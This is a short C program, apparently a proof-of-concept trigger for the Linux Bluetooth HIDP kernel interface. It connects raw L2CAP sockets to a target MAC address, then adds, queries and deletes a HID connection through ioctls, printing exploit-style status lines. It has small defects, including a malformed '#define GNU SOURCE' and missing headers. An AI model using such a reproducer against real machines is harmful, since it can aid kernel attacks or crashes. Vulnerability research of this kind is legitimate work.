#define GNU SOURCE
#include <stdlib.h>
#include <stdbool.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hidp.h>
#include <bluetooth/l2cap.h>


static int connect_l2cap(bdaddr_t dst_addr, uint16_t *handle) {
	int l2_sock;

	if ((l2_sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("[-] socket");
		return -1;
	}

	struct sockaddr_l2 laddr = {0};
	laddr.l2_family = AF_BLUETOOTH;
	memcpy(&laddr.l2_bdaddr, BDADDR_ANY, sizeof(bdaddr_t));
	if (bind(l2_sock, (struct sockaddr *)&laddr, sizeof(laddr)) < 0) {
		perror("[-] bind");
		return -1;
	}

	struct sockaddr_l2 raddr = {0};
	raddr.l2_family = AF_BLUETOOTH;
	raddr.l2_bdaddr = dst_addr;
	if (connect(l2_sock, (struct sockaddr *)&raddr, sizeof(raddr)) < 0 &&
		errno != EALREADY) {
		perror("[-] connect");
		return -1;
	}

	struct l2cap_conninfo conninfo = {0};
	socklen_t len = sizeof(conninfo);
	if (getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &conninfo, &len) < 0) {
		perror("[-] getsockopt");
		return -1;
	}

	if (handle)
		*handle = conninfo.hci_handle;

	return l2_sock;
}


int main(int argc, char **argv)
{
	if (argc != 2) {
		printf("Usage: %s target_mac\n", argv[0]);
		exit(1);
	}

	bdaddr_t dst_addr = {0};
	str2ba(argv[1], &dst_addr);

	printf("[*] HIDPCONNADD 0x%lx\n", HIDPCONNADD);
	
	// printf("[*] Opening hci device...\n");
	// hci_sock = connect_hci();

	printf("[*] Connecting...\n");
	int ctrl_sock = connect_l2cap(dst_addr, NULL);
	if (ctrl_sock < 0)
	{
		perror("[-] Create ctrl sock");
		exit(-1);
	}

	int intr_sock = connect_l2cap(dst_addr, NULL);
	if (intr_sock < 0)
	{
		perror("[-] Create ctrl sock");
		exit(-1);
	}

	struct hidp_connadd_req add_req = {0};

	add_req.ctrl_sock = ctrl_sock;
	add_req.intr_sock = intr_sock;
	add_req.idle_to = 0x20;

	strcpy(add_req.name, "hci0");
	int hidp_sock = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HIDP);
	if (hidp_sock < 0) 
	{
		perror("Can't open HIDP socket");
		exit(1);
	}

	int ret = ioctl(hidp_sock, HIDPCONNADD, &add_req);
	printf("[*] add ioctl %d\n", ret);

	struct hidp_conninfo info_req = {0};
	memcpy(&info_req.bdaddr, &dst_addr, sizeof(dst_addr));
	ret = ioctl(hidp_sock, HIDPGETCONNINFO, &info_req);
	printf("[*] info ioctl STATE %d, ret %d\n", info_req.state, ret);


	struct hidp_conndel_req del_req = {0};
	memcpy(&del_req.bdaddr, &dst_addr, sizeof(dst_addr));

	ret = ioctl(hidp_sock, HIDPCONNDEL, &del_req);
	printf("[*] del ioctl %d\n", ret);

	return 0;
}
